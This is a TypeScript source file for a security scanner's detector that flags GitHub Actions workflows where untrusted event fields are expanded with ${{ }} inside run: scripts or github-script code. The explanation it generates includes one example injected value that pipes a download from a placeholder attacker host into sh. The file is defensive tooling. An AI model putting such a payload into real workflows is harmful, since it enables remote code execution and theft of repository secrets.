import type {
  Confidence,
  Detector,
  Finding,
  ScanContext,
  Severity,
} from "@talaljaber/vibesafe-shared";
import { classifyPath, isTestOrFixturePath } from "./utils/file-kind.js";
import { makeFinding } from "./utils/finding.js";
import { capFindingsPerRule } from "./utils/infra-common.js";
import { findGhExpressions, parseWorkflow, type YamlText } from "./utils/yaml-lines.js";

/**
 * Event fields an outside user controls (titles, bodies, branch names, commit
 * messages, author names). Numbers, SHAs, logins and `secrets.*` are not included.
 */
const UNTRUSTED_FIELD_RE =
  /\bgithub\.(?:head_ref\b|event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.(?:ref|label)|head\.repo\.default_branch)|comment\.body|review\.body|review_comment\.body|discussion\.(?:title|body)|pages\b[^\s}]*?\.page_name|commits\b[^\s}]*?\.(?:message|author\.(?:email|name))|head_commit\.(?:message|author\.(?:email|name)|committer\.(?:email|name))|workflow_run\.(?:head_branch|display_title|head_commit\.(?:message|author\.(?:email|name)))|release\.(?:name|body))\b)/;

/** `toJSON(github.event)` or `toJSON(github.event.<object>)`: serializes the untrusted fields too. */
const UNTRUSTED_TOJSON_RE =
  /\btoJSON\(\s*github\.event(?:\.(?:issue|pull_request|comment|review|review_comment|discussion|head_commit|commits|workflow_run|release|pages))?\s*\)/i;

/** Triggers any GitHub user can fire, whose jobs get secrets and a write token. */
const OUTSIDER_TRIGGERS = new Set([
  "issues",
  "issue_comment",
  "pull_request_target",
  "pull_request_review",
  "pull_request_review_comment",
  "discussion",
  "discussion_comment",
  "workflow_run",
]);

/**
 * Flags `${{ <untrusted event field> }}` expanded inside a `run:` script or an
 * `actions/github-script` `script:`. GitHub substitutes the text before the shell or
 * Node.js sees it, so a crafted issue title or branch name becomes code. Uses in
 * `env:`, `if:`, `name:` or `with:` inputs other than `script` are safe and ignored.
 */
export class GhaScriptInjectionDetector implements Detector {
  id = "gha-script-injection-detector";
  name = "GitHub Actions Script Injection";
  category = "injection" as const;
  description =
    "Detects untrusted GitHub event fields (issue titles, PR bodies, branch names) expanded with ${{ }} inside run: or github-script code.";

  async detect(context: ScanContext): Promise<Finding[]> {
    const findings: Finding[] = [];
    for (const file of context.files) {
      const kind = classifyPath(file);
      if (kind !== "workflow" && kind !== "gh-action") continue;
      if (isTestOrFixturePath(file) && context.config.includeTests !== true) continue;
      try {
        const text = await context.readFile(file);
        if (!text.includes("${{")) continue;
        const lines = text.split(/\r?\n/);
        const wf = parseWorkflow(text);
        const outsider = wf.triggers.some((t) => OUTSIDER_TRIGGERS.has(t.value));
        const prTrigger = wf.triggers.some((t) => t.value === "pull_request");
        let severity: Severity = "medium";
        let confidence: Confidence = "medium";
        let context_ = "a trigger that only trusted users usually fire";
        if (outsider) {
          severity = "high";
          confidence = "high";
          context_ =
            "an event any GitHub user can trigger, in a job that has the repository's secrets and token";
        } else if (prTrigger) {
          confidence = "high";
          context_ = "pull_request, so a fork can run commands on the runner (without secrets)";
        }

        for (const job of wf.jobs) {
          for (const step of job.steps) {
            const scripts: { text: YamlText; where: string }[] = [];
            if (step.run) scripts.push({ text: step.run, where: "run:" });
            const isGithubScript =
              step.uses?.owner.toLowerCase() === "actions" &&
              step.uses.repo.toLowerCase() === "github-script";
            const script = step.with["script"];
            if (isGithubScript && script) scripts.push({ text: script, where: "github-script" });
            for (const { text: body, where } of scripts) {
              for (const l of body.lines) {
                for (const ex of findGhExpressions(l.value)) {
                  const m = UNTRUSTED_FIELD_RE.exec(ex.expr) ?? UNTRUSTED_TOJSON_RE.exec(ex.expr);
                  if (!m) continue;
                  const shellComment = where === "run:" && /^\s*#/.test(l.value);
                  findings.push(
                    makeFinding({
                      category: "injection",
                      ruleId: "injection/gha-script-injection",
                      title: `Untrusted ${m[0]} expanded inside ${where === "run:" ? "a run: script" : "github-script code"}`,
                      severity,
                      confidence: shellComment ? "medium" : confidence,
                      file,
                      line: l.line,
                      evidence: lines[l.line - 1] ?? l.value,
                      discriminator: `${ex.start}:${ex.expr}`,
                      plainEnglishProblem: `\`\${{ ${m[0]} }}\` is pasted into the ${where === "run:" ? "shell script" : "JavaScript"} before it runs. The workflow runs on ${context_}. Text such as \`"; curl https://attacker/x | sh; "\` in that field becomes part of the command.`,
                      whyItMatters:
                        "Script injection lets whoever writes the issue title, comment, PR body or branch name run arbitrary commands on the runner, steal every secret and token available to the job, and push code or publish releases with them.",
                      fixSteps: [
                        'Pass the value through an environment variable instead: `env: TITLE: ${{ github.event.issue.title }}` on the step, then use `"$TITLE"` (quoted) in the script.',
                        "In github-script, read it from `context.payload` (e.g. `context.payload.issue.title`) instead of an expression.",
                        "Never put `${{ }}` with user-controlled fields directly inside `run:` or `script:`.",
                      ],
                      aiFixPrompt:
                        "My GitHub Actions workflow expands an untrusted event field (such as an issue title, comment body, pull request title or branch name) with ${{ }} directly inside a run: script or github-script code, which allows script injection. Move each such value into the step's env: block and reference it as a quoted shell variable (or via context.payload in github-script), so the value is treated as data and never as code.",
                    }),
                  );
                }
              }
            }
          }
        }
      } catch {
        // Never throw from a detector.
      }
    }
    return capFindingsPerRule(findings);
  }
}
